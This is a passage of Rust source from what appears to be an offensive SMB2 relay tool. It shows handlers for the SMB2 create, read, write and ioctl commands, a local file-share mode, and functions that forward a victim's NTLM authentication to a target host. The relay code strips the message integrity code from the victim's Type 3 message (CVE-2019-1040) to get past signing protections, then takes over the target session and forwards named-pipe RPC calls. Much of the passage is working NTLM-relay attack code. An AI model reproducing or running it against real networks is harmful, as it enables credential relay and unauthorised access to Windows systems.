        (STATUS_SUCCESS, vec![0x10, 0x00])
    }

    /// Handle SMB2 Create (0x0005) -- forward in relay mode
    async fn handle_create(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 64 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }

        // FileShare mode: resolve the requested name against the backing
        // directory (own MS-SMB2-correct parsing, independent of the legacy
        // pipe-name offsets below).
        if session.file_share_root.is_some() {
            let root = session.file_share_root.clone().unwrap_or_default();
            return Self::file_share_create(data, &root, session);
        }

        let name_off = u16::from_le_bytes([body[36], body[37]]) as usize;
        let name_len = u16::from_le_bytes([body[38], body[39]]) as usize;
        if name_off + name_len > data.len() {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let name_bytes = &data[name_off..name_off + name_len];
        let pipe_name = String::from_utf16_lossy(
            &name_bytes
                .chunks(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect::<Vec<_>>(),
        );
        let is_pipe = pipe_name.starts_with(r"\pipe\") || pipe_name.starts_with("pipe\\");
        if !is_pipe {
            return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
        }

        debug!("Opening named pipe: {}", pipe_name);

        // In relay mode, forward to target
        if let Some(ref mut relay) = session.relay_session {
            return Self::relay_create(relay, &pipe_name).await;
        }

        // Capture mode
        let persistent_id = rand::random::<u64>();
        let volatile_id = rand::random::<u64>();
        session.open_files.push(SmbFile {
            persistent_id,
            write_data: Vec::new(),
            path: None,
            for_write: false,
        });

        let mut resp = Vec::with_capacity(128);
        resp.extend_from_slice(&89u16.to_le_bytes());
        resp.push(OPLOCK_LEVEL_NONE);
        resp.push(0x00);
        resp.extend_from_slice(&FILE_OPEN.to_le_bytes());
        resp.extend_from_slice(&[0u8; 40]); // timestamps + sizes
        resp.extend_from_slice(&0x0000_0080u32.to_le_bytes());
        resp.extend_from_slice(&[0u8; 4]);
        resp.extend_from_slice(&persistent_id.to_le_bytes());
        resp.extend_from_slice(&volatile_id.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        (STATUS_SUCCESS, resp)
    }

    fn handle_close(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 24 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let persistent_id = match read_u64_le(body, 8) {
            Some(id) => id,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        // Flush disk-backed files opened for writing (FileShare mode)
        let mut flush: Option<(PathBuf, Vec<u8>)> = None;
        session.open_files.retain(|f| {
            if f.persistent_id != persistent_id {
                return true;
            }
            if f.for_write
                && let Some(p) = &f.path
            {
                flush = Some((p.clone(), f.write_data.clone()));
            }
            false
        });
        if let Some((path, contents)) = flush {
            if let Some(parent) = path.parent().filter(|p| !p.as_os_str().is_empty()) {
                let _ = std::fs::create_dir_all(parent);
            }
            return match std::fs::write(&path, &contents) {
                Ok(()) => {
                    info!(
                        "FileShare: wrote {} bytes to {}",
                        contents.len(),
                        path.display()
                    );
                    let mut resp = vec![0u8; 60];
                    resp[0..2].copy_from_slice(&60u16.to_le_bytes());
                    (STATUS_SUCCESS, resp)
                }
                Err(e) => {
                    warn!("FileShare: write to {} failed: {}", path.display(), e);
                    (STATUS_ACCESS_DENIED, vec![])
                }
            };
        }
        let mut resp = vec![0u8; 60];
        resp[0..2].copy_from_slice(&60u16.to_le_bytes());
        (STATUS_SUCCESS, resp)
    }

    fn handle_read(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 24 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let read_len = match read_u32_le(body, 4) {
            Some(len) => len,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let persistent_id = match read_u64_le(body, 16) {
            Some(id) => id,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        // FileShare mode: serve from disk at the requested offset
        if let Some(path) = session
            .open_files
            .iter()
            .find(|f| f.persistent_id == persistent_id)
            .and_then(|f| f.path.clone())
        {
            let offset = read_u64_le(body, 8).unwrap_or(0);
            return Self::file_share_read(&path, offset, read_len);
        }
        let data_buf = session
            .open_files
            .iter()
            .find(|f| f.persistent_id == persistent_id)
            .map(|f| f.write_data.clone())
            .unwrap_or_default();
        let actual_len = data_buf.len().min(read_len as usize);
        let mut resp = Vec::with_capacity(32);
        resp.extend_from_slice(&17u16.to_le_bytes());
        resp.push(8u8);
        resp.push(0u8);
        resp.push(0u8);
        resp.push(0u8);
        resp.extend_from_slice(&(actual_len as u32).to_le_bytes());
        resp.extend_from_slice(&data_buf[..actual_len]);
        (STATUS_SUCCESS, resp)
    }

    fn handle_write(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 24 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let data_off = match read_u16_le(body, 2) {
            Some(off) => off as usize,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let data_len = match read_u32_le(body, 4) {
            Some(len) => len,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let persistent_id = match read_u64_le(body, 16) {
            Some(id) => id,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        if data_off + data_len as usize <= data.len() {
            let wdata = data[data_off..data_off + data_len as usize].to_vec();
            if let Some(file) = session
                .open_files
                .iter_mut()
                .find(|f| f.persistent_id == persistent_id)
            {
                if file.path.is_some() {
                    // FileShare mode: merge into the in-memory image at the
                    // requested offset; flushed to disk on close.
                    let write_offset = read_u64_le(body, 8).unwrap_or(0) as usize;
                    let end = write_offset.saturating_add(wdata.len());
                    if file.write_data.len() < end {
                        file.write_data.resize(end, 0);
                    }
                    file.write_data[write_offset..end].copy_from_slice(&wdata);
                    file.for_write = true;
                } else {
                    file.write_data = wdata;
                }
            }
        }
        let mut resp = Vec::with_capacity(32);
        resp.extend_from_slice(&17u16.to_le_bytes());
        resp.extend_from_slice(&[0u8; 3]);
        resp.extend_from_slice(&data_len.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&0u16.to_le_bytes());
        resp.extend_from_slice(&0u16.to_le_bytes());
        (STATUS_SUCCESS, resp)
    }

    /// Handle SMB2 Ioctl (0x000B) -- forward through relay session in relay mode
    async fn handle_ioctl(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 56 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }

        let ctl_code = match read_u32_le(body, 4) {
            Some(code) => code,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let input_off = match read_u32_le(body, 20) {
            Some(off) => off,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let input_len = match read_u32_le(body, 24) {
            Some(len) => len,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let max_output = match read_u32_le(body, 36) {
            Some(max) => max,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };

        if ctl_code != FSCTL_PIPE_TRANSCEIVE {
            debug!("Unsupported IOCTL code 0x{:08X}", ctl_code);
            return (STATUS_NOT_SUPPORTED, vec![]);
        }

        let dce_request = if input_off + input_len <= data.len() as u32 {
            data[input_off as usize..input_off as usize + input_len as usize].to_vec()
        } else {
            return (STATUS_INVALID_PARAMETER, vec![]);
        };

        debug!(
            "FSCTL_PIPE_TRANSCEIVE received ({} bytes input)",
            dce_request.len()
        );

        // In relay mode: forward through target's named pipe via IOCTL
        if let Some(ref mut relay) = session.relay_session {
            return Self::relay_ioctl(relay, &dce_request, max_output).await;
        }

        // Capture mode: echo back
        let mut resp = Vec::with_capacity(128);
        resp.extend_from_slice(&57u16.to_le_bytes());
        resp.extend_from_slice(&[0u8; 2]);
        resp.extend_from_slice(&ctl_code.to_le_bytes());
        let file_id = if body.len() >= 24 {
            &body[8..24]
        } else {
            &[0u8; 16]
        };
        resp.extend_from_slice(file_id);
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        let out_off = 64 + resp.len() as u32 + 12;
        resp.extend_from_slice(&out_off.to_le_bytes());
        resp.extend_from_slice(&(dce_request.len() as u32).to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes());
        resp.extend_from_slice(&[0u8; 4]);
        resp.extend_from_slice(&dce_request);
        (STATUS_SUCCESS, resp)
    }

    fn handle_logoff(session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        session.session_id = 0;
        session.session_key = None;
        session.session_setup_complete = false;
        session.tree_id = 0;
        session.open_files.clear();
        (STATUS_SUCCESS, vec![0x04, 0x00])
    }

    // ===========================================================
    // FileShare mode: local directory backing store (smbserver parity)
    // ===========================================================

    /// Handle SMB2 Create against the share's backing directory.
    ///
    /// Parses the CREATE request per MS-SMB2 2.2.13 (fixed body = 56 bytes):
    /// DesiredAccess at body 24, CreateDisposition at 36, CreateOptions at
    /// 40; NameOffset/NameLength fields at body 44/46 with the values being
    /// absolute from the SMB2 header start.
    fn file_share_create(
        data: &[u8],
        root: &Path,
        session: &mut SmbClientSession,
    ) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 56 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let name_off = match read_u16_le(body, 44) {
            Some(v) => v as usize,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        let name_len = match read_u16_le(body, 46) {
            Some(v) => v as usize,
            None => return (STATUS_INVALID_PARAMETER, vec![]),
        };
        if name_off + name_len > data.len() {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let name = if name_len == 0 {
            String::new()
        } else {
            String::from_utf16_lossy(
                &data[name_off..name_off + name_len]
                    .chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect::<Vec<_>>(),
            )
        };

        let disposition = read_u32_le(body, 36).unwrap_or(FILE_OPEN);
        let create_options = read_u32_le(body, 40).unwrap_or(0);
        let desired_access = read_u32_le(body, 24).unwrap_or(FILE_READ_DATA);

        // Empty name = the share root directory itself
        let is_dir_open = create_options & FILE_DIRECTORY_FILE != 0 || name.is_empty();
        let resolved = match Self::resolve_share_path(root, &name) {
            Some(p) => p,
            None => {
                warn!("FileShare: rejected path traversal attempt: {:?}", name);
                return (STATUS_ACCESS_DENIED, vec![]);
            }
        };

        let mut create_action = 1u32; // FILE_OPENED
        if is_dir_open {
            let exists = resolved.is_dir();
            match disposition {
                FILE_CREATE if exists => return (STATUS_OBJECT_NAME_COLLISION, vec![]),
                FILE_OPEN if !exists => return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]),
                FILE_OVERWRITE | FILE_SUPERSEDE if !exists => {
                    return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
                }
                FILE_CREATE | FILE_OPEN_IF | FILE_OVERWRITE_IF if !exists => {
                    if let Err(e) = std::fs::create_dir_all(&resolved) {
                        debug!("FileShare: mkdir failed: {}", e);
                        return (STATUS_ACCESS_DENIED, vec![]);
                    }
                    create_action = 2; // FILE_CREATED
                }
                _ => {}
            }
        } else {
            let exists = resolved.is_file();
            match disposition {
                FILE_OPEN if !exists => return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]),
                FILE_CREATE if exists => return (STATUS_OBJECT_NAME_COLLISION, vec![]),
                FILE_OVERWRITE | FILE_SUPERSEDE if !exists => {
                    return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
                }
                FILE_CREATE | FILE_OPEN_IF | FILE_OVERWRITE_IF => {
                    if !exists {
                        if let Some(parent) =
                            resolved.parent().filter(|p| !p.as_os_str().is_empty())
                        {
                            let _ = std::fs::create_dir_all(parent);
                        }
                        if let Err(e) = std::fs::File::create(&resolved) {
                            debug!("FileShare: file create failed: {}", e);
                            return (STATUS_ACCESS_DENIED, vec![]);
                        }
                        create_action = 2; // FILE_CREATED
                    } else if disposition == FILE_OVERWRITE || disposition == FILE_SUPERSEDE {
                        let _ = std::fs::write(&resolved, b"");
                    }
                }
                _ => {}
            }
        }

        // Register the open file
        let persistent_id = rand::random::<u64>();
        let for_write = desired_access & FILE_WRITE_DATA != 0
            || matches!(
                disposition,
                FILE_CREATE | FILE_OPEN_IF | FILE_OVERWRITE | FILE_OVERWRITE_IF | FILE_SUPERSEDE
            );
        let (ctime, atime, wtime) = Self::file_times(&resolved);
        let size = std::fs::metadata(&resolved)
            .map(|m| if m.is_file() { m.len() } else { 0 })
            .unwrap_or(0);
        let attributes = if std::fs::metadata(&resolved)
            .map(|m| m.is_dir())
            .unwrap_or(false)
        {
            FILE_ATTRIBUTE_DIRECTORY
        } else {
            FILE_ATTRIBUTE_NORMAL
        };
        session.open_files.push(SmbFile {
            persistent_id,
            write_data: Vec::new(),
            path: Some(resolved),
            for_write,
        });

        let mut resp = Vec::with_capacity(120);
        resp.extend_from_slice(&89u16.to_le_bytes());
        resp.push(OPLOCK_LEVEL_NONE);
        resp.push(0x00);
        resp.extend_from_slice(&create_action.to_le_bytes());
        resp.extend_from_slice(&ctime.to_le_bytes());
        resp.extend_from_slice(&atime.to_le_bytes());
        resp.extend_from_slice(&wtime.to_le_bytes());
        resp.extend_from_slice(&wtime.to_le_bytes()); // ChangeTime
        resp.extend_from_slice(&0u64.to_le_bytes()); // AllocationSize
        resp.extend_from_slice(&size.to_le_bytes()); // EndOfFile
        resp.extend_from_slice(&attributes.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes()); // Reserved
        resp.extend_from_slice(&persistent_id.to_le_bytes());
        let volatile_id = rand::random::<u64>();
        resp.extend_from_slice(&volatile_id.to_le_bytes());
        resp.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsOffset
        resp.extend_from_slice(&0u32.to_le_bytes()); // CreateContextsLength
        debug!("FileShare: opened {:?} (id {})", name, persistent_id);
        (STATUS_SUCCESS, resp)
    }

    /// Handle SMB2 Read against a disk-backed open file.
    fn file_share_read(path: &Path, offset: u64, read_len: u32) -> (u32, Vec<u8>) {
        let contents = match std::fs::read(path) {
            Ok(c) => c,
            Err(e) => {
                debug!("FileShare: read {} failed: {}", path.display(), e);
                return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
            }
        };
        let start = offset.min(contents.len() as u64) as usize;
        let end = start.saturating_add(read_len as usize).min(contents.len());
        let chunk = &contents[start..end];
        let mut resp = Vec::with_capacity(16 + chunk.len());
        resp.extend_from_slice(&17u16.to_le_bytes()); // StructureSize
        resp.push(80u8); // DataOffset (header 64 + body 16)
        resp.push(0u8); // Reserved
        resp.extend_from_slice(&(chunk.len() as u32).to_le_bytes()); // DataLength
        resp.extend_from_slice(&0u32.to_le_bytes()); // DataRemaining
        resp.extend_from_slice(&0u32.to_le_bytes()); // Reserved2
        resp.extend_from_slice(chunk);
        (STATUS_SUCCESS, resp)
    }

    /// Handle SMB2 QUERY_DIRECTORY (0x000E). Only FileDirectoryInformation
    /// (class 0x01) is produced; any file share backing store is listed with
    /// an RFC-style `*`/`?` glob over the share root.
    async fn handle_query_directory(data: &[u8], session: &mut SmbClientSession) -> (u32, Vec<u8>) {
        let body = &data[SMB2_HEADER_SIZE..];
        if body.len() < 32 {
            return (STATUS_INVALID_PARAMETER, vec![]);
        }
        let Some(root) = session.file_share_root.clone() else {
            // Legacy behavior for capture/relay modes
            return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
        };

        let info_class = body[2];
        let flags = body[3];
        if info_class != FILE_DIRECTORY_INFORMATION_CLASS {
            debug!(
                "FileShare: unsupported QUERY_DIRECTORY class {}",
                info_class
            );
            return (STATUS_NOT_SUPPORTED, vec![]);
        }

        let name_off = read_u16_le(body, 28).unwrap_or(0) as usize;
        let name_len = read_u16_le(body, 30).unwrap_or(0) as usize;
        let pattern = if name_off + name_len <= data.len() && name_len > 0 {
            String::from_utf16_lossy(
                &data[name_off..name_off + name_len]
                    .chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], c[1]]))
                    .collect::<Vec<_>>(),
            )
        } else {
            "*".to_string()
        };

        let mut names: Vec<(String, bool, u64)> = Vec::new();
        let entries = match std::fs::read_dir(&root) {
            Ok(rd) => rd,
            Err(e) => {
                debug!("FileShare: read_dir {} failed: {}", root.display(), e);
                return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
            }
        };
        for entry in entries.flatten() {
            let fname = entry.file_name().to_string_lossy().to_string();
            if !Self::glob_match(&pattern, &fname) {
                continue;
            }
            let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
            let size = entry
                .metadata()
                .map(|m| if m.is_file() { m.len() } else { 0 })
                .unwrap_or(0);
            names.push((fname, is_dir, size));
            if flags & QUERY_DIRECTORY_RETURN_SINGLE_ENTRY != 0 && !names.is_empty() {
                break;
            }
        }
        names.sort_by(|a, b| a.0.cmp(&b.0));

        // Build FILE_DIRECTORY_INFORMATION entries (MS-FSCC 2.4.10)
        let mut buf: Vec<u8> = Vec::with_capacity(names.len() * 80);
        for (i, (fname, is_dir, size)) in names.iter().enumerate() {
            let name_u16: Vec<u8> = fname.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
            let fixed = 64 + 4;
            let entry_len = fixed + name_u16.len();
            let padded = (entry_len + 7) & !7;
            let next = if i + 1 == names.len() {
                0u32
            } else {
                padded as u32
            };

            buf.extend_from_slice(&next.to_le_bytes());
            buf.extend_from_slice(&0u32.to_le_bytes()); // FileIndex
            let (ctime, atime, wtime) = Self::file_times_for(&root.join(fname));
            buf.extend_from_slice(&ctime.to_le_bytes());
            buf.extend_from_slice(&atime.to_le_bytes());
            buf.extend_from_slice(&wtime.to_le_bytes());
            buf.extend_from_slice(&wtime.to_le_bytes()); // ChangeTime
            buf.extend_from_slice(&size.to_le_bytes()); // EndOfFile
            buf.extend_from_slice(&size.to_le_bytes()); // AllocationSize
            let attrs = if *is_dir {
                FILE_ATTRIBUTE_DIRECTORY
            } else {
                FILE_ATTRIBUTE_NORMAL
            };
            buf.extend_from_slice(&attrs.to_le_bytes());
            buf.extend_from_slice(&(name_u16.len() as u32).to_le_bytes()); // FileNameLength
            buf.extend_from_slice(&name_u16);
            while !buf.len().is_multiple_of(8) {
                buf.push(0);
            }
        }

        if buf.is_empty() {
            return (STATUS_OBJECT_NAME_NOT_FOUND, vec![]);
        }

        // Response: StructureSize(9), OutputBufferOffset(u16),
        // OutputBufferLength(u32), then the buffer.
        let out_off = (SMB2_HEADER_SIZE + 8) as u16;
        let mut resp = Vec::with_capacity(8 + buf.len());
        resp.extend_from_slice(&9u16.to_le_bytes());
        resp.extend_from_slice(&out_off.to_le_bytes());
        resp.extend_from_slice(&(buf.len() as u32).to_le_bytes());
        resp.extend_from_slice(&buf);
        (STATUS_SUCCESS, resp)
    }

    /// Convert a share-relative name into a safe local path. Rejects absolute
    /// paths, drive/UNC separators, and `..` traversal components.
    fn resolve_share_path(root: &Path, name: &str) -> Option<PathBuf> {
        let trimmed = name.trim_start_matches('\\').trim_start_matches('/');
        if trimmed.contains(':') || trimmed.starts_with('\\') || trimmed.starts_with('/') {
            return None;
        }
        let mut out = root.to_path_buf();
        for comp in trimmed.split(['\\', '/']) {
            if comp.is_empty() {
                continue;
            }
            if comp == ".." || comp == "." {
                return None;
            }
            out.push(comp);
        }
        Some(out)
    }

    /// Case-insensitive glob with `*` and `?` wildcards.
    fn glob_match(pattern: &str, name: &str) -> bool {
        let p: Vec<char> = pattern.to_lowercase().chars().collect();
        let n: Vec<char> = name.to_lowercase().chars().collect();
        let (mut pi, mut ni) = (0usize, 0usize);
        let (mut star_p, mut star_n) = (usize::MAX, 0usize);
        while ni < n.len() {
            if pi < p.len() && (p[pi] == '?' || p[pi] == n[ni]) {
                pi += 1;
                ni += 1;
            } else if pi < p.len() && p[pi] == '*' {
                star_p = pi;
                star_n = ni;
                pi += 1;
            } else if star_p != usize::MAX {
                pi = star_p + 1;
                star_n += 1;
                ni = star_n;
            } else {
                return false;
            }
        }
        while pi < p.len() && p[pi] == '*' {
            pi += 1;
        }
        pi == p.len()
    }

    /// FILETIME triple (creation, access, write) for a path; zeros when
    /// metadata is unavailable.
    fn file_times(path: &Path) -> (u64, u64, u64) {
        Self::file_times_for(path)
    }

    fn file_times_for(path: &Path) -> (u64, u64, u64) {
        match std::fs::metadata(path).map(|m| {
            let created = m.created().unwrap_or(UNIX_EPOCH);
            let accessed = m.accessed().unwrap_or(UNIX_EPOCH);
            let modified = m.modified().unwrap_or(UNIX_EPOCH);
            (created, accessed, modified)
        }) {
            Ok((c, a, m)) => (
                systemtime_to_filetime(c),
                systemtime_to_filetime(a),
                systemtime_to_filetime(m),
            ),
            Err(_) => (0, 0, 0),
        }
    }

    // ===========================================================
    // Relay: SMB2 client to target
    // ===========================================================

    /// Connect to the target, negotiate, and send NTLM Type 1.
    /// Returns (raw NTLM Type2 challenge blob, relay session).
    async fn relay_negotiate_and_type1(
        target_host: &str,
        target_port: u16,
        _session: &SmbClientSession,
        victim_negotiate: &[u8],
        socks5_proxy: Option<&str>,
    ) -> Result<(Vec<u8>, SmbRelaySession)> {
        let addr = crate::utils::format_addr(target_host, target_port);
        let target: SocketAddr = addr
            .parse()
            .map_err(|e| RelayError::Socket(format!("invalid relay address '{}': {}", addr, e)))?;
        let timeout = Duration::from_secs(30);
        let mut stream = crate::utils::socks5_connect(target, timeout, socks5_proxy)
            .await
            .map_err(|e| RelayError::Socket(format!("relay connect to {}: {}", addr, e)))?;

        let mut buf = vec![0u8; 65536];
        let mut msg_id = 0u64;

        // Forward negotiate to target
        let req = Self::build_relay_negotiate(&victim_negotiate[SMB2_HEADER_SIZE..], msg_id);
        msg_id += 1;
        stream
            .write_all(&req)
            .await
            .map_err(|e| RelayError::Socket(format!("relay negotiate write: {}", e)))?;
        let n = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Socket(format!("relay negotiate read: {}", e)))?;
        let _negotiate_resp = &buf[..n];

        // Build SMB2 session setup with NTLM Type 1 extracted from victim
        let victim_type1 = Self::extract_ntlmssp_from_smb2_session_setup(victim_negotiate);
        if victim_type1.is_empty() {
            return Err(RelayError::Config("No NTLM Type 1 in victim session".into()).into());
        }
        let sec_blob = Self::wrap_spnego_init(&victim_type1);
        let setup_req = Self::build_relay_session_setup(msg_id, &sec_blob);
        msg_id += 1;
        stream
            .write_all(&setup_req)
            .await
            .map_err(|e| RelayError::Socket(format!("relay session_setup write: {}", e)))?;
        let n = stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Socket(format!("relay session_setup read: {}", e)))?;

        // Parse the target's response
        let target_data = &buf[..n];
        let smb2_start = if target_data.len() > 4 && target_data[0] == 0x00 {
            4
        } else {
            0
        };
        if target_data.len() < smb2_start + SMB2_HEADER_SIZE + 8 {
            return Err(RelayError::Config("Short relay session setup response".into()).into());
        }
        let target_status = match read_u32_le(&target_data[smb2_start..], 8) {
            Some(s) => s,
            None => return Err(RelayError::Config("Short relay response (status)".into()).into()),
        };

        if target_status != STATUS_MORE_PROCESSING_REQUIRED {
            return Err(
                RelayError::Config("Target did not challenge (unexpected status)".into()).into(),
            );
        }

        let target_body = &target_data[smb2_start + SMB2_HEADER_SIZE..];
        let t_sec_off = u16::from_le_bytes([target_body[4], target_body[5]]) as usize;
        let t_sec_len = u16::from_le_bytes([target_body[6], target_body[7]]) as usize;
        if t_sec_off + t_sec_len > target_data.len() - smb2_start {
            return Err(
                RelayError::Config("Invalid security buffer in relay response".into()).into(),
            );
        }
        let sec_data = &target_data[smb2_start + t_sec_off..smb2_start + t_sec_off + t_sec_len];
        let challenge_blob = Self::extract_ntlmssp(sec_data);
        if challenge_blob.is_empty() {
            return Err(RelayError::Config("No NTLM challenge in relay response".into()).into());
        }

        let target_session_id = match read_u64_le(&target_data[smb2_start..], 44) {
            Some(id) => id,
            None => {
                return Err(RelayError::Config("Short relay response (session id)".into()).into());
            }
        };

        let relay_sess = SmbRelaySession {
            stream,
            session_id: target_session_id,
            message_id: msg_id,
            tree_id: 0,
            file_id: None,
        };

        Ok((challenge_blob, relay_sess))
    }

    /// Forward NTLM Type 3 to the target and extract the session key
    async fn relay_type3_and_extract_key(
        relay: &mut SmbRelaySession,
        ntlmssp_type3: &[u8],
    ) -> Result<(u64, Vec<u8>)> {
        // Strip MIC from victim's Type 3 before forwarding to target (CVE-2019-1040).
        // When the relay modifies the challenge (e.g., stripping channel bindings),
        // the MIC computed by the victim will be invalid. Removing it causes the
        // target server to skip MIC verification, enabling relay even when the DC
        // enforces signing ("Require" mode, LdapServerIntegrity = 2).
        let cleaned = overthrone_core::proto::ntlm::strip_mic_from_type3(ntlmssp_type3);
        let sec_blob = Self::wrap_spnego_init(&cleaned);
        let req = Self::build_relay_session_setup(relay.message_id, &sec_blob);
        relay.message_id += 1;
        relay
            .stream
            .write_all(&req)
            .await
            .map_err(|e| RelayError::Socket(format!("relay auth3 write: {}", e)))?;

        let mut buf = vec![0u8; 65536];
        let n = relay
            .stream
            .read(&mut buf)
            .await
            .map_err(|e| RelayError::Socket(format!("relay auth3 read: {}", e)))?;
        let target_data = &buf[..n];
        let smb2_start = if target_data.len() > 4 && target_data[0] == 0x00 {
            4
        } else {
            0
        };
        if target_data.len() < smb2_start + SMB2_HEADER_SIZE + 8 {
            return Err(RelayError::Config("Short relay auth3 response".into()).into());
        }
        let target_status = match read_u32_le(&target_data[smb2_start..], 8) {
            Some(s) => s,
            None => {
                return Err(
                    RelayError::Config("Short relay auth3 response (status)".into()).into(),
                );
            }
        };
        if target_status != STATUS_SUCCESS {
            return Err(RelayError::Config(format!(
                "Target auth failed with status 0x{:08X}",
                target_status
            ))
            .into());
        }

        let target_session_id = match read_u64_le(&target_data[smb2_start..], 44) {
            Some(id) => id,
            None => {
                return Err(
                    RelayError::Config("Short relay auth3 response (session id)".into()).into(),
                );
            }
        };

        // Extract session key from the target's response security buffer
        let target_body = &target_data[smb2_start + SMB2_HEADER_SIZE..];
        let t_sec_off = u16::from_le_bytes([target_body[4], target_body[5]]) as usize;
        let t_sec_len = u16::from_le_bytes([target_body[6], target_body[7]]) as usize;
        let session_key = if t_sec_len > 0
            && t_sec_off + t_sec_len <= target_data.len() - smb2_start
        {
            let sec_data = &target_data[smb2_start + t_sec_off..smb2_start + t_sec_off + t_sec_len];
            // The session key is in the NTLM Type 2's key exchange field
            Self::extract_session_key_from_challenge(sec_data)
        } else {
            Vec::new()
        };

        relay.session_id = target_session_id;
        Ok((target_session_id, session_key))
    }

    /// Forward SMB2 Tree Connect to the target
    async fn relay_tree_connect(relay: &mut SmbRelaySession, path: &str) -> (u32, Vec<u8>) {
        let body = Self::build_tree_connect_body(path);
        let pkt = Self::build_relay_request(
            relay.message_id,
            relay.session_id,
            relay.tree_id,
            SMB2_TREE_CONNECT,
            &body,
        );
        relay.message_id += 1;
        if relay.stream.write_all(&pkt).await.is_err() {
            return (STATUS_LOGON_FAILURE, vec![]);
        }
        let mut buf = vec![0u8; 65536];
        let n = match relay.stream.read(&mut buf).await {
            Ok(n) => n,
            Err(_) => return (STATUS_LOGON_FAILURE, vec![]),
        };
        let resp = &buf[..n];
        let smb2_start = if resp.len() > 4 && resp[0] == 0x00 {
            4
        } else {
            0
        };
        if resp.len() < smb2_start + SMB2_HEADER_SIZE + 2 {
            return (STATUS_LOGON_FAILURE, vec![]);
        }
        let status = match read_u32_le(&resp[smb2_start..], 8) {
            Some(s) => s,
            None => return (STATUS_LOGON_FAILURE, vec![]),
        };
        if status == STATUS_SUCCESS
            && let Some(tid) = read_u32_le(&resp[smb2_start..], 40)
        {
            relay.tree_id = tid;
        }
        let resp_body = if resp.len() > smb2_start + SMB2_HEADER_SIZE {
            resp[smb2_start + SMB2_HEADER_SIZE..].to_vec()
        } else {
            vec![]
        };
        (status, resp_body)
    }

    /// Forward SMB2 Create (named pipe) to the target
    async fn relay_create(relay: &mut SmbRelaySession, pipe_name: &str) -> (u32, Vec<u8>) {
        let body = Self::build_create_body(pipe_name);
        let pkt = Self::build_relay_request(
            relay.message_id,
            relay.session_id,
            relay.tree_id,
            SMB2_CREATE,
            &body,
        );
        relay.message_id += 1;
        if relay.stream.write_all(&pkt).await.is_err() {
            return (STATUS_LOGON_FAILURE, vec![]);
        }
        let mut buf = vec![0u8; 65536];
        let n = match relay.stream.read(&mut buf).await {
            Ok(n) => n,
            Err(_) => return (STATUS_LOGON_FAILURE, vec![]),
        };
        let resp = &buf[..n];
        let smb2_start = if resp.len() > 4 && resp[0] == 0x00 {
            4
        } else {
            0
        };
        if resp.len() < smb2_start + SMB2_HEADER_SIZE + 2 {
            return (STATUS_LOGON_FAILURE, vec![]);
        }
        let status = match read_u32_le(&resp[smb2_start..], 8) {
            Some(s) => s,
            None => return (STATUS_LOGON_FAILURE, vec![]),
        };
        // Extract file id from create response (bytes 60-75 of body)
        if status == STATUS_SUCCESS && resp.len() > smb2_start + SMB2_HEADER_SIZE + 76 {
            let mut fid = [0u8; 16];
            let body_start = smb2_start + SMB2_HEADER_SIZE;
            fid.copy_from_slice(&resp[body_start + 60..body_start + 76]);
            relay.file_id = Some(fid);
        }
        let resp_body = if resp.len() > smb2_start + SMB2_HEADER_SIZE {
            resp[smb2_start + SMB2_HEADER_SIZE..].to_vec()
        } else {
            vec![]
        };
        (status, resp_body)
    }

    /// Forward DCE/RPC via IOCTL FSCTL_PIPE_TRANSCEIVE on the target
    async fn relay_ioctl(
        relay: &mut SmbRelaySession,
        dce_input: &[u8],
        max_output: u32,
